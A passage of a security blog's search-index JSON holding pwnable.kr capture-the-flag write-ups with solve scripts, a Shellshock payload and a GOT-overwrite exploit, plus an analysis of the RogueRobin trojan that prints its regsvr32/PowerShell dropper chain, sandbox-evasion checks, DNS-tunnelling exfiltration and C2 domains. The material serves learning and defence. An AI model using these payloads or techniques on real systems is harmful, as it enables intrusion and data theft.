p32(0x0804a004)\t# passcode1 pointing to fflush GOT entry buf += str(0x080485e3)\t# send as a number not an address  print(buf)   $ python /tmp/solve.py | ./passcode  Toddler's Secure Login System 1.0 beta. enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA! Sorry mom.. I got confused about scanf usage :( enter passcode1 : Now I can safely trust you that you have credential :)   Flag: Sorry mom.. I got confused about scanf usage :(  ","categories": ["Binary Exploitation"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/binary%20exploitation/passcode/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/binary-exploitation/pwnable.kr/thumbnails/pwnable.png"
      },{
        "title": "Pwnable.kr - random",
        "excerpt":"   Challenge description:     Daddy, teach me how to use random value in programming!    #include &lt;stdio.h&gt;  int main(){ \tunsigned int random; \trandom = rand();\t// random value!  \tunsigned int key=0; \tscanf(\"%d\", &amp;key);  \tif( (key ^ random) == 0xdeadbeef ){ \t\tprintf(\"Good!\\n\"); \t\tsystem(\"/bin/cat flag\"); \t\treturn 0; \t}  \tprintf(\"Wrong, maybe you should try 2^32 cases.\\n\"); \treturn 0; }   This challenge focuses on pseudo-random number generators, the randomness of the generated numbers depends on the seed, different seeds result in different sequence of numbers each time.   The bug in this code is that it uses the default seed each time, which is 1. This will generate the same sequence every time and we can predict the first number in the sequence.   If we compile this code and add printf(\"%d\", random), we get the value 1804289383. This value XORed with 0xdeadbeef will get us -1255736440 which is the key (the unsigned value works as well).   Solution:   random@pwnable:~$ ./random  -1255736440 Good! Mommy, I thought libc random is unpredictable...   Flag: Mommy, I thought libc random is unpredictable...  ","categories": ["Binary Exploitation"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/binary%20exploitation/random/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/binary-exploitation/pwnable.kr/thumbnails/pwnable.png"
      },{
        "title": "Deep Analysis of RogueRobin Trojan (DarkHydrus APT)",
        "excerpt":"First Stage: Excel document [Dropper]   MD5: 8DC9F5450402AE799F5F8AFD5C0A8352   The first stage of this malware is an excel document with a macro, it asks to click Enable Content to run the macro, the document doesn’t contain any data (not so convincing).      To view the macro, from the Developer tab (File –&gt; Options –&gt; Customize Ribbon –&gt; Developer Checkbox), click Visual Basic and you can see the macro.   The macro first writes a long powershell script to %TEMP%\\WINDOWSTEMP.ps1, Then it writes an SCT script to %TEMP%\\12-B-366.txt.   &lt;?XML version=\"1.0\"?&gt; &lt;scriptlet&gt;     &lt;registration progid = \"PoC\" classid=\"{F0001111-0000-0000-0000-0000FEEDACDC}\" &gt;         &lt;script language=\"JScript\"&gt;             &lt;![CDATA[ var r = new ActiveXObject(\"WScript.Shell\").Run(\"\" + powershell_command + \"\", 0, true); ]]&gt;         &lt;/script&gt;     &lt;/registration&gt; &lt;/scriptlet&gt;   Finally it runs this SCT script with the command:   regsvr32.exe /s /n /u /i: %TEMP%\\12-B-366.txt scrobj.dll   The SCT script will run a powershell command which executes the powershell script that was written to the temp folder:   powershell.exe -noexit -exec bypass -File %TEMP%\\WINDOWSTEMP.ps1   The powershell script contains a large base64 string which is decoded and Gzip decompressed then it’s written to %APPDATA%\\Microsoft\\Windows\\Templates\\WindowsTemplate.exe and gets executed.   At last it creates a shortcut to this executable at the startup folder under the name %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OneDrive.lnk(one way to achieve persistence but very easily detectable).   So the chain works as follows:   SCT script   –run–&gt;   Powershell script   –drop–&gt;   Final executable   Second Stage: .NET Executable   MD5: 039BD47F0FDB6BB7D68A2428C71F317D   The malware code is not obfuscated which is very helpful.   First the malware checks sandboxEvision_controler variable and if it’s true (which is not in this sample), it tries some sandbox evasion techniques then it goes to the main functionality.      Sandbox Evasion           check if windows BIOS version SMBIOSBIOSVERSION contains any of these strings:       VBOX bochs qemu VirtualBox VM                check if win32_computersystem matches VMware            check if TotalPhysicalMemory &lt; 2900000000 bytes            check if NumberOfProcessorCores &lt; 1            check if any Wireshark or Sysinternals process is running            check if there is any attached debugger       If any one of these conditions is true, the malware will exit.                                    Persistence   After the sandbox evasion, the malware checks hasStartup variable and if it’s true (which is not in this sample), it copies it self to %APPDATA%\\OneDrive.exe and creates a shortcut at the startup folder under the name OneDrive.lnk.   This step was already done by the powershell script which explains why the hasStartup variable is set to false.      C2 Communications   This malware uses a technique called DNS Tunneling which leverages the DNS requests to send and receive data (usually DNS requests are not filtered by the firewall which makes this technique very powerful).   C2 Domains:     0ffice365.agency     0nedrive.agency     corewindows.agency     microsoftonline.agency     onedrive.agency     sharepoint.agency     skydrive.agency     0ffice365.life     0ffice365.services     skydrive.services   The malware first flushes the DNS cache with the command:   ipconfig /flushdns   Then it loops through the C2 domains and send a DNS query to each one of them, it has three variants or modes:   normal request:       nslookup.exe -q={DNS_quest_type} {id}.{domain_name} ac mode is enables:   nslookup.exe -timeout=5 -q={DNS_quest_type} {id}.ac.{domain_name} debugger is attached: nslookup.exe -timeout=5 -q={DNS_quest_type} 676f6f646c75636b.ac.{domain_name}   Interestingly enough, if we decode 676f6f646c75636b (the value added if a debugger is attached), we get the value goodluck, the malware author is trying to be funny with the analyst :)   Here is the possible DNS query types used by the malware:   DNS query types:     MX     TXT     A     AAAA   The request id is generated by calling GetCurrentProcess() then transforming the process id to a string with these replacements:   0 --&gt; h 1 --&gt; i 2 --&gt; j 3 --&gt; k 4 --&gt; l 5 --&gt; m 6 --&gt; n 7 --&gt; o 8 --&gt; p 9 --&gt; q   In this case, the process id was 3206 which translates to kjnh, the id is prefixed with the request_type which is either a,b,c or d and the comm_model is appended to the end of the id which is just the letter ‘c’.   Example of the connections:         If the response contains any of these strings, the query function returns “cancel”:   216.58.192.174 2a00:1450:4001:81a::200e 2200:: download.microsoft.com ntservicepack.microsoft.com windowsupdate.microsoft.com update.microsoft.com      If the response contains any of these strings, the query function moves to the next domain:   timeout UnKnown can Unspecified error      If the response contains any of these strings, the query function returns the DNS response and exits:   canonical name mx namerserver mail serve address   After getting the response, the malware passes it to magic() function which takes two parameters: the DNS response and a state, the state can be one of these strings:   getjob havejob getid   At this stage, the malware passes getid to get a unique id of length 2, if the response wasn’t valid, the returned id is set to “0”.   After looping through all the domains, the malware checks if the id has a length of 2 (which indicates that it successfully connected to one of the C2 domains), if not, the malware loops through the C2 domains again but with the waiting value doubled. The initial waiting value is 120 ms and the maximum allowed value is 7200 ms (which means that it can loop 6 time only).   In case of a successful connection, the malware sends the computer info along with the connections results to the C2 server, computer info includes: internal network IP, host name, domain name, username, if the current user is admin, and some of the malware configuration variables. It should look like this:   10.0.2.15|IEuser-PC|WORKGROUP|IEuser|01|0|0|1|1|0|cs   Here we can see the use of DNS Tunneling to send the data to the C2 server in spliting() function which is responsible for sending data, first it determines the chunk size by getting a random value between [min_query_size, max_query_size] which in in this sample is [30, 32] then it sends it in the DNS request in the form data.domain.   Note that the max length for a subdomain cannot be longer than 63 characters, that’s why the data is split into chunks.      Receiving Commands   The malware queries the C2 server every second, it extracts commands using these regular expressions:   Address:\\\\s+(([a-fA-F0-9]{0,4}:{1,2}){1,8}) Address:\\\\s+\\\\d+.\\\\d+.\\\\d+.\\\\d+ Address:\\\\s+40.112.(\\\\d+.\\\\d+) \\\\s(\\\\w{3}).(domain_1|domain_2|...|domain_n)   If the malware receives a new command, it will start a new thread to execute it:      Here is the list of commands:                  Command       Description                       kill {thread_name}       kill a specific malware thread                 fileDownload {file_path}       download a file from the victim’s machine                 fileUpload {file_path}       upload a file to the victim’s machine                 importModule {powershell_command}       run a powershell command then add it to “modules” list                 ClearModules       clear “modules” list                 x_mode {OFF | x_mode values}       disable or enable x_mode (Google Drive mode)                 testmode       test connection to C2 domains                 showconfig       return config variables including the C2 domains and DNS query types                 changeConfig       change config variables                 slp       change sleep and jitter values                 exit       exit the malware process           Google Drive As Alternative C2 (x_mode)   This malware have a mode called x_mode which makes it use Google Drive as a C2 server, this mode is disabled by default and can be enabled by receiving a command from one of the C2 DNS servers.      We can see some configuration variables for this x_mode, let’s go though them one by one:   gdu:   This is the Google Drive URL used for downloading data.      gduu:   This is the Google Drive URL used for uploading data, you can see UploadData() called twice. The first time to create a new file with file_name, the second time is to upload the file content to the newly created file.      gdo2t:   This is the Google Drive URL that is used to obtain OAUTH 2 access token. this is necessary to authorize requests to the Google Drive API.   client_id, cs, r_t:   Client ID, Client Secret and Refresh Token. These three variables are used in the request to the access token.      Now that we know the usage of each configuration variable, let’s dig into the process of communicating and receiving commands from Google Drive.                                    The first thing the malware does is to get an API access token, then it checks f_id and if it’s empty, it uploads a file with the name {process_id}.txt and its contents is the encoded process_id . current_C2_domain.   After that it stores this file’s modification_time and uploads another file with the name {process_id}-U.txt and its content is process_id.   If any of these operations returned an error instead of a valid file id, the malware deletes these two files and loops again to repeat the process.                                    The last step is that the malware compares the file {process_id}.txt modification time with the stored modification time and if it’s not the same, it downloads the new file content (the new attacker commands) and updates the modification time. Then it goes though the same parsing and command extraction techniques used with the DNS Tunneling.   And that wrap up this analysis.   IOCs   Hashes   First stage: 8DC9F5450402AE799F5F8AFD5C0A8352   Second stage: 039BD47F0FDB6BB7D68A2428C71F317D   Files   %TEMP%\\WINDOWSTEMP.ps1   %TEMP%\\12-B-366.txt   %APPDATA%\\Microsoft\\Windows\\Templates\\WindowsTemplate.exe   %APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OneDrive.lnk   C2 Domains   0ffice365[.]agency   0nedrive[.]agency   corewindows[.]agency   microsoftonline[.]agency   onedrive[.]agency   sharepoint[.]agency   skydrive[.]agency   0ffice365[.]life   0ffice365[.]services   skydrive[.]services   External References   https://www.paloaltonetworks.com/cyberpedia/what-is-dns-tunneling   https://blog.centurylink.com/ismdoor-malware-continues-to-make-use-of-dns-tunneling  ","categories": ["Malware Analysis"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/malware%20analysis/roguerobin-trojan/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/malware-analysis/roguerobin-trojan/2.png"
      },{
        "title": "Pwnable.kr - input",
        "excerpt":"   Challenge description:     Mom? how can I pass my input to a computer program?    #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;sys/socket.h&gt; #include &lt;arpa/inet.h&gt;  int main(int argc, char* argv[], char* envp[]){ \tprintf(\"Welcome to pwnable.kr\\n\"); \tprintf(\"Let's see if you know how to give input to program\\n\"); \tprintf(\"Just give me correct inputs then you will get the flag :)\\n\");  \t// argv \tif(argc != 100) return 0; \tif(strcmp(argv['A'],\"\\x00\")) return 0; \tif(strcmp(argv['B'],\"\\x20\\x0a\\x0d\")) return 0; \tprintf(\"Stage 1 clear!\\n\");\t  \t// stdio \tchar buf[4]; \tread(0, buf, 4); \tif(memcmp(buf, \"\\x00\\x0a\\x00\\xff\", 4)) return 0; \tread(2, buf, 4);     if(memcmp(buf, \"\\x00\\x0a\\x02\\xff\", 4)) return 0; \tprintf(\"Stage 2 clear!\\n\"); \t \t// env \tif(strcmp(\"\\xca\\xfe\\xba\\xbe\", getenv(\"\\xde\\xad\\xbe\\xef\"))) return 0; \tprintf(\"Stage 3 clear!\\n\");  \t// file \tFILE* fp = fopen(\"\\x0a\", \"r\"); \tif(!fp) return 0; \tif( fread(buf, 4, 1, fp)!=1 ) return 0; \tif( memcmp(buf, \"\\x00\\x00\\x00\\x00\", 4) ) return 0; \tfclose(fp); \tprintf(\"Stage 4 clear!\\n\");\t  \t// network \tint sd, cd; \tstruct sockaddr_in saddr, caddr; \tsd = socket(AF_INET, SOCK_STREAM, 0); \tif(sd == -1){ \t\tprintf(\"socket error, tell admin\\n\"); \t\treturn 0; \t} \tsaddr.sin_family = AF_INET; \tsaddr.sin_addr.s_addr = INADDR_ANY; \tsaddr.sin_port = htons( atoi(argv['C']) ); \tif(bind(sd, (struct sockaddr*)&amp;saddr, sizeof(saddr)) &lt; 0){ \t\tprintf(\"bind error, use another port\\n\");     \t\treturn 1; \t} \tlisten(sd, 1); \tint c = sizeof(struct sockaddr_in); \tcd = accept(sd, (struct sockaddr *)&amp;caddr, (socklen_t*)&amp;c); \tif(cd &lt; 0){ \t\tprintf(\"accept error, tell admin\\n\"); \t\treturn 0; \t} \tif( recv(cd, buf, 4, 0) != 4 ) return 0; \tif(memcmp(buf, \"\\xde\\xad\\xbe\\xef\", 4)) return 0; \tprintf(\"Stage 5 clear!\\n\");  \t// here's your flag \tsystem(\"/bin/cat flag\");\t \treturn 0; }   The challenges tests your ability to feed input to different sources.   Stage 1 (command line args):      argc (num of arguments) = 100   argv[‘A’] = argv[65] = “\\x00”   argv[‘B’] = argv[66] = “\\x20\\x0a\\x0d”   Stage 2 (stdin and stderr):      stdin  = “\\x00\\x0a\\x00\\xff”   stderr = “\\x00\\x0a\\x02\\xff”   Stage 3 (environment variables):      “\\xde\\xad\\xbe\\xef”  = “\\xca\\xfe\\xba\\xbe”   Stage 4 (file input):      content of file with name “\\x0a” = “\\x00\\x00\\x00\\x00”   Stage 5 (network input):      send “\\xde\\xad\\xbe\\xef” to the connection listening on port (argv[‘C’] = argv[67])      We can only create new files at /tmp (for stage 4).     For some reason, pwn tools doesn’t work at /tmp, so we create a subfolder and cd to it.     If we change directory to /tmp/folder_name, the binary will not be able to read “flag” as it’s not in the same directory, so we create a symbolic link to it with “ln -s”.    Solution:   # solve.py  from pwn import * import os  args = ['A']*100 args[65] = '\\x00' args[66] = '\\x20\\x0a\\x0d' args[67] = '4444'  r1, w1 = os.pipe() r2, w2 = os.pipe() os.write(w1, '\\x00\\x0a\\x00\\xff') os.write(w2, '\\x00\\x0a\\x02\\xff')  with open('\\x0a', 'w') as f: \tf.write('\\x00\\x00\\x00\\x00')  p = process(executable='/home/input2/input',  \t    argv=args,  \t    stdin=r1, stderr=r2,  \t    env={'\\xde\\xad\\xbe\\xef' :'\\xca\\xfe\\xba\\xbe'})  conn = remote('localhost', 4444) conn.sendline('\\xde\\xad\\xbe\\xef')  p.interactive()   $ cd /tmp $ mkdir cjmpql $ cd cjmpql $ nano solve.py\t     # write the solution to this file $ ln -s /home/input2/flag flag $ python solve.py  [+] Starting local process '/home/input2/input': pid 114109 [+] Opening connection to localhost on port 4444: Done [*] Switching to interactive mode [*] Process '/home/input2/input' stopped with exit code 0 (pid 114109) Welcome to pwnable.kr Let's see if you know how to give input to program Just give me correct inputs then you will get the flag :) Stage 1 clear! Stage 2 clear! Stage 3 clear! Stage 4 clear! Stage 5 clear! Mommy! I learned how to pass various input in Linux :)   Flag: Mommy! I learned how to pass various input in Linux :)  ","categories": ["Binary Exploitation"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/binary%20exploitation/input/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/binary-exploitation/pwnable.kr/thumbnails/pwnable.png"
      },{
        "title": "Pwnable.kr - leg",
        "excerpt":"   Challenge description:     Daddy told me I should study arm. But I prefer to study my leg!    #include &lt;stdio.h&gt; #include &lt;fcntl.h&gt;  int key1(){ \tasm(\"mov r3, pc\\n\"); }  int key2(){ \tasm( \t\"push\t{r6}\\n\" \t\"add\tr6, pc, $1\\n\" \t\"bx\tr6\\n\" \t\".code   16\\n\" \t\"mov\tr3, pc\\n\" \t\"add\tr3, $0x4\\n\" \t\"push\t{r3}\\n\" \t\"pop\t{pc}\\n\" \t\".code\t32\\n\" \t\"pop\t{r6}\\n\" \t); }  int key3(){ \tasm(\"mov r3, lr\\n\"); }  int main(){ \tint key=0; \tprintf(\"Daddy has very strong arm! : \"); \tscanf(\"%d\", &amp;key); \tif( (key1()+key2()+key3()) == key ){ \t\tprintf(\"Congratz!\\n\"); \t\tint fd = open(\"flag\", O_RDONLY); \t\tchar buf[100]; \t\tint r = read(fd, buf, 100); \t\twrite(0, buf, r); \t} \telse{ \t\tprintf(\"I have strong leg :P\\n\"); \t} \treturn 0; }   This is a simple arm challenge. It compares the input key with the sum of 3 functions, we are also given the assembly of the code (because the result of the sum depends on the pc register value). I will only show the important parts of assembly that will get us the right key.   Here is the important part of main assembly:      0x00008d68 &lt;+44&gt;:\tbl\t0x8cd4 &lt;key1&gt;    0x00008d6c &lt;+48&gt;:\tmov\tr4, r0\t\t; result of key1    0x00008d70 &lt;+52&gt;:\tbl\t0x8cf0 &lt;key2&gt;    0x00008d74 &lt;+56&gt;:\tmov\tr3, r0\t\t; result of key2    0x00008d78 &lt;+60&gt;:\tadd\tr4, r4, r3    0x00008d7c &lt;+64&gt;:\tbl\t0x8d20 &lt;key3&gt;    0x00008d80 &lt;+68&gt;:\tmov\tr3, r0\t\t; result of key3    0x00008d84 &lt;+72&gt;:\tadd\tr2, r4, r3   key1():      0x00008cdc &lt;+8&gt;:\tmov\tr3, pc    0x00008ce0 &lt;+12&gt;:\tmov\tr0, r3    0x00008ce4 &lt;+16&gt;:\tsub\tsp, r11, #0   result will be stored at r3, its value is $pc which is (next_instruction + 4) 0x00008ce4.   key2():      0x00008d04 &lt;+20&gt;:\tmov\tr3, pc    0x00008d06 &lt;+22&gt;:\tadds\tr3, #4    0x00008d08 &lt;+24&gt;:\tpush\t{r3}   result will be stored at r3, its value is $pc+4 which is (next_instruction + 4) + 4 0x00008d0c.   key3():      0x00008d28 &lt;+8&gt;:\tmov\tr3, lr    0x00008d2c &lt;+12&gt;:\tmov\tr0, r3   result will be stored at r3, its value is $lr which is the return address 0x00008d80.   The result of the sum is 0x00008ce4 + 0x00008d0c + 0x00008d80 = 108400.   Solution:   $ ./leg  Daddy has very strong arm! : 108400 Congratz! My daddy has a lot of ARMv5te muscle!   Flag: My daddy has a lot of ARMv5te muscle!  ","categories": ["Binary Exploitation"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/binary%20exploitation/leg/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/binary-exploitation/pwnable.kr/thumbnails/pwnable.png"
      },{
        "title": "Pwnable.kr - mistake",
        "excerpt":"   Challenge description:     We all make mistakes, let’s move on. (don’t take this too seriously, no fancy hacking skill is required at all)     This task is based on real event Thanks to dhmonkey     hint : operator priority    #include &lt;stdio.h&gt; #include &lt;fcntl.h&gt;  #define PW_LEN 10 #define XORKEY 1  void xor(char* s, int len){ \tint i; \tfor(i=0; i&lt;len; i++){ \t\ts[i] ^= XORKEY; \t} }  int main(int argc, char* argv[]){ \t \tint fd; \tif(fd=open(\"/home/mistake/password\",O_RDONLY,0400) &lt; 0){ \t\tprintf(\"can't open password %d\\n\", fd); \t\treturn 0; \t}  \tprintf(\"do not bruteforce...\\n\"); \tsleep(time(0)%20);  \tchar pw_buf[PW_LEN+1]; \tint len; \tif(!(len=read(fd,pw_buf,PW_LEN) &gt; 0)){ \t\tprintf(\"read error\\n\"); \t\tclose(fd); \t\treturn 0;\t\t \t}  \tchar pw_buf2[PW_LEN+1]; \tprintf(\"input password : \"); \tscanf(\"%10s\", pw_buf2);  \t// xor your input \txor(pw_buf2, 10);  \tif(!strncmp(pw_buf, pw_buf2, PW_LEN)){ \t\tprintf(\"Password OK\\n\"); \t\tsystem(\"/bin/cat flag\\n\"); \t} \telse{ \t\tprintf(\"Wrong Password\\n\"); \t}  \tclose(fd); \treturn 0; }   This challenge requires some observation. first it opens /home/mistake/password then it reads from it (supposedly) and stores the value in pw_buf.   Next it reads 10 characters into pw_buf2, XORes it with 0x1 and compares it with pw_buf.   If we run the binary, we see something strange:   $ ./mistake  do not bruteforce... my_input1 input password : my_input_2 Wrong Password   As you can see, it asks for input twice, hmmmm.   The mistake here is in this line (operator priority as the hint says):   if(fd=open(\"/home/mistake/password\",O_RDONLY,0400) &lt; 0)   It assigns the value of the expression open(\"/home/mistake/password\",O_RDONLY,0400) &lt; 0 to fd, this expression is either true (1) or false (0), in this case the file opens with no errors and the result is fd = 0 which is stdin, oppps!.   So we have the ability to control pw_buf, then XOR it with 0x1 and enter this value to pw_buf2 and finally get the flag.   By the way, the fix to this mistake is by adding parenthesis like this (fd = ...) &lt; 0.   Solution:   mistake@pwnable:~$ ./mistake  do not bruteforce... AAAAAAAAAA input password : @@@@@@@@@@ Password OK Mommy, the operator priority always confuses me :(   Flag: Mommy, the operator priority always confuses me :(  ","categories": ["Binary Exploitation"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/binary%20exploitation/mistake/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/binary-exploitation/pwnable.kr/thumbnails/pwnable.png"
      },{
        "title": "Pwnable.kr - shellshock",
        "excerpt":"   Challenge description:     Mommy, there was a shocking news about bash. I bet you already know, but lets just make it sure :)    #include &lt;stdio.h&gt; int main(){ \tsetresuid(getegid(), getegid(), getegid()); \tsetresgid(getegid(), getegid(), getegid()); \tsystem(\"/home/shellshock/bash -c 'echo shock_me'\"); \treturn 0; }   The challenge represents the very well known vulnerability CVE-2014-6271 also known as shellshock. I won’t go into details of how it works (see the references for more info).   we are given a bash binary at our working directory, to test if it’s vulnerable to shellshock you can run the following command:   shellshock@pwnable:~$ env x='() { :;}; echo TEST' ./bash -c : TEST   It printed TEST which means this bash is vulnerable to shellshock, It will exit silently if bash has been patched.   The challenge is just a call to bash -c so we can treat it as ./bash and pass to it what we want to execute (/bin/cat flag).   Solution:   shellshock@pwnable:~$ env x='() { :;}; /bin/cat flag' ./shellshock only if I knew CVE-2014-6271 ten years ago..!!   References:   https://fedoramagazine.org/shellshock-how-does-it-actually-work/   ","categories": ["Binary Exploitation"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/binary%20exploitation/shellshock/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/binary-exploitation/pwnable.kr/thumbnails/pwnable.png"
      },{
        "title": "Pwnable.kr - coin1",
        "excerpt":"   Challenge description:     Mommy, I wanna play a game! (if your network response time is too slow, try nc 0 9007 inside pwnable.kr server)    In this challenge we are not given any binary or source code, it’s just a netcat connection:   $ nc pwnable.kr 9007      --------------------------------------------------- \t-              Shall we play a game?              - \t--------------------------------------------------- \t \tYou have given some gold coins in your hand \thowever, there is one counterfeit coin among them \tcounterfeit coin looks exactly same as real coin \thowever, its weight is different from real one \treal coin weighs 10, counterfeit coin weighes 9 \thelp me to find the counterfeit coin with a scale \tif you find 100 counterfeit coins, you will get reward :) \tFYI, you have 60 seconds. \t \t- How to play -  \t1. you get a number of coins (N) and number of chances (C) \t2. then you specify a set of index numbers of coins to be weighed \t3. you get the weight information \t4. 2~3 repeats C time, then you give the answer \t \t- Example - \t[Server] N=4 C=2 \t# find counterfeit among 4 coins with 2 trial \t[Client] 0 1 \t\t# weigh first and second coin \t[Server] 20\t\t\t# scale result : 20 \t[Client] 3\t\t\t# weigh fourth coin \t[Server] 10\t\t\t# scale result : 10 \t[Client] 2 \t\t\t# counterfeit coin is third! \t[Server] Correct!  \t- Ready? starting in 3 sec... -   As described above, we are given a range of numbers (N) and we have to find the bad number in a limited number of tries (C).   Because the tries are limited, we need an efficient way to send the minimum number of queries. Whats better than Binary Search.   If you don’t know binary search, here is a little explanation:   given N=10 and Bad=6:  [1,2,3,4,5,6,7,8,9,10]\t==&gt; current search space search at the first half: [1,2,3,4,5]\t==&gt; weight is 50, divisible by 10, bad not here so we through the first half away  [6,7,8,9,10]\t==&gt; current search space search at the first half: [6,7]\t==&gt; weight is 19, not divisible by 10, bad is definitely here so we through the second half away  [6,7]\t==&gt; current search space search at the first half: [6]\t==&gt; weight is 9, not divisible by 10, range length is 1 so this is the bad number  Num of queries: 3   You can ssh using any of the previous challenges credentials and run the script locally (much faster than the remote connection).   Solution:   # solve.py  from pwn import * import re  p = remote('localhost', 9007) print(p.recv())  for i in range(100): \tN, C = re.findall(\"N=(\\d+) C=(\\d+)\", p.recv())[0] \tN = int(N) \tC = int(C) \tprint(N, C)  \tstart, end = 0, N-1  \twhile start &lt;= end and C &gt; 0: \t\tmid = (start + end) // 2 \t\tx = \" \".join([str(j) for j in range(start, mid+1)])\t# build range list \t\tp.sendline(x) \t\t \t\tres = int(p.recvline()[:-1]) \t\tif res % 10 == 0: \t\t\tstart = mid+1\t# through first half \t\telse: \t\t\tend = mid-1\t\t# through second half \t\tC -= 1  \twhile C &gt; 0:\t# use all the tries \t\tp.sendline(\"0\") \t\tp.recv(1024) \t\tC -= 1  \tp.sendline(str(start))\t# final answer \tprint(p.recv())  print(p.recv())   $ python solve.py ..... (736, 10) Correct! (0) ..... (359, 9) Correct! (98)  (137, 8) Correct! (99)  Congrats! get your flag b1NaRy_S34rch1nG_1s_3asy_p3asy   Flag: b1NaRy_S34rch1nG_1s_3asy_p3asy  ","categories": ["Binary Exploitation"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/binary%20exploitation/coin1/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/binary-exploitation/pwnable.kr/thumbnails/pwnable.png"
      },{
        "title": "Pwnable.kr - blackjack",
        "excerpt":"   Challenge description:     Hey! check out this C implementation of blackjack game! I found it online     * http://cboard.cprogramming.com/c-programming/114023-simple-blackjack-program.html     I like to give my flags to millionares. how much money you got?    In this challenge we have a simple blackjack game source code and we have to find a bug in it that will make us millionares :)   The game is simple, you enter a bet and if you win you get the bet, otherwise you pay it.   After looking at the source code, I noticed something interesting:   int betting() //Asks user amount to bet {     printf(\"\\n\\nEnter Bet: $\");     scanf(\"%d\", &amp;bet);      if (bet &gt; cash) //If player tries to bet more money than player has     {         printf(\"\\nYou cannot bet more money than you have.\");         printf(\"\\nEnter Bet: \");         scanf(\"%d\", &amp;bet);         return bet;     }     else return bet; } // End Function   The function checks if the bet is less than the player’s cash (which is 500$ at the beginning), there’s two solutions here to be a millionare:           we can enter million twice and win the game (it checks bet value only once).            we can enter negative million and lose the game.       As losing is much easier than winning, we will go for the second option.   Solution:   Cash: $500 ------- |H    | |  4  | |    H| -------  Your Total is 4  The Dealer Has a Total of 4  Enter Bet: $-1000000   YaY_I_AM_A_MILLIONARE_LOL  Cash: $1000500 ------- |C    | |  2  | |    C| -------  Your Total is 2  The Dealer Has a Total of 2   Flag: YaY_I_AM_A_MILLIONARE_LOL  ","categories": ["Binary Exploitation"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/binary%20exploitation/blackjack/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/binary-exploitation/pwnable.kr/thumbnails/pwnable.png"
      },{
        "title": "Pwnable.kr - lotto",
        "excerpt":"   Challenge description:     Mommy! I made a lotto program for my homework. do you want to play?    #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;fcntl.h&gt;  unsigned char submit[6];  void play(){ \t \tint i; \tprintf(\"Submit your 6 lotto bytes : \"); \tfflush(stdout);  \tint r; \tr = read(0, submit, 6);  \tprintf(\"Lotto Start!\\n\"); \t//sleep(1);  \t// generate lotto numbers \tint fd = open(\"/dev/urandom\", O_RDONLY); \tif(fd==-1){ \t\tprintf(\"error. tell admin\\n\"); \t\texit(-1); \t} \tunsigned char lotto[6]; \tif(read(fd, lotto, 6) != 6){ \t\tprintf(\"error2. tell admin\\n\"); \t\texit(-1); \t} \tfor(i=0; i&lt;6; i++){ \t\tlotto[i] = (lotto[i] % 45) + 1;\t\t// 1 ~ 45 \t} \tclose(fd); \t \t// calculate lotto score \tint match = 0, j = 0; \tfor(i=0; i&lt;6; i++){ \t\tfor(j=0; j&lt;6; j++){ \t\t\tif(lotto[i] == submit[j]){ \t\t\t\tmatch++; \t\t\t} \t\t} \t}  \t// win! \tif(match == 6){ \t\tsystem(\"/bin/cat flag\"); \t} \telse{ \t\tprintf(\"bad luck...\\n\"); \t}  } // The rest of the code is not important   The game asks for 6 bytes and compares them with 6 random bytes in the range [1-45], if the number of matches is 6 we win the game.   The observation here is that it compares each random byte to all the 6 input bytes, so if there is only one match, we win :)   So we will enter 6 of the same character (in the range [1-45]) and hope there is a match.   Solution:   # solve.py  from pwn import *  sh = ssh('lotto', 'pwnable.kr', password='guest', port=2222) p = sh.process('./lotto')  for i in range(1000): \tp.recv() \tp.sendline('1') \tp.recv() \tp.sendline('------') \t_ , ans = p.recvlines(2) \tif \"bad\" not in ans: \t\tprint(ans) \t\tbreak   $ python solve.py [+] Connecting to pwnable.kr on port 2222: Done [+] Starting remote process './lotto' on pwnable.kr: pid 102926 sorry mom... I FORGOT to check duplicate numbers... :(   Flag: sorry mom... I FORGOT to check duplicate numbers... :(  ","categories": ["Binary Exploitation"],
        "tags": [],
        "url": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/binary%20exploitation/lotto/",
        "teaser": "https://github.com/elbouzarazi/elbouzarazi.github.io/pages/elbouzarazi/assets/images/binary-exploitation/pwnable.kr/thumbnails/pwnable.png"
      },{
        "title": "Pwnable.kr - cmd1",
